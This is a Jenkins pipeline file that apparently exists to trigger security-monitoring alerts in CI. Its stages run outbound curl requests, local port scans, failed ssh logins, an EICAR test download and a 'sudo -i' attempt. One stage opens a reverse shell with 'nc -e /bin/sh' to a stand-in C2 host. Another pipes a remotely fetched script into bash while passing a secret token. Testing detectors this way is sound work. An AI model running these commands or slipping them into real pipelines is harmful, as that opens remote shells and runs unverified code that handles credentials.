pipeline {
    agent any
    environment {
        CODECOV_TOKEN = credentials('codecov-token') // Ensure this credential is set in Jenkins
    }
    stages {
        stage('Checkout') {
            steps {
                git url: 'https://github.com/schnitz-air/my-security-test-pipeline.git', branch: 'main'
            }
        }
        stage('Run Tests') {
            steps {
                script {
                    docker.image('python:3.8').inside {
                        sh 'pytest'
                    }
                }
            }
        }
        stage('Test Outgoing Traffic') {
            steps {
                script {
                    sh 'curl -v http://httpbin.org/get'
                    sh 'curl -v https://httpbin.org/get'
                    sh 'curl -v -H "Accept: application/json" http://httpbin.org/get'
                    sh 'curl -v -X POST -H "Content-Type: application/json" -d \'{"key": "value"}\' http://httpbin.org/post'
                    sh 'curl -v --connect-timeout 10 --retry 5 https://httpbin.org/get'
                }
            }
        }
        stage('Network Scan') {
            steps {
                sh 'nmap -sT localhost'
            }
        }
        stage('File System Changes') {
            steps {
                sh 'touch /root/sensitive_file.txt'
                sh 'echo "Suspicious content" > /root/sensitive_file.txt'
                sh 'rm /root/sensitive_file.txt'
            }
        }
        stage('Unauthorized Access Attempts') {
            steps {
                sh 'for i in {1..5}; do ssh invalid-user@localhost; done'
            }
        }
        stage('Simulate Malware') {
            steps {
                sh 'curl -O https://secure.eicar.org/eicar.com'
                sh 'cat eicar.com'
                sh 'rm eicar.com'
            }
        }
        stage('Privilege Escalation Attempt') {
            steps {
                sh 'sudo -i'
            }
        }
        stage('Port Scanning') {
            steps {
                sh 'nc -zv localhost 1-1000'
            }
        }
        stage('C2 Traffic Simulation') {
            steps {
                sh 'nc -e /bin/sh badc2server.com 8080'
            }
        }
        stage('Upload Coverage to Codecov') {
            steps {
                script {
                    docker.image('python:3.8').inside {
                        sh 'bash <(curl -s https://codecov.io/bash) -t ${CODECOV_TOKEN}'
                    }
                }
            }
        }
    }
    post {
        always {
            cleanWs()
        }
    }
}
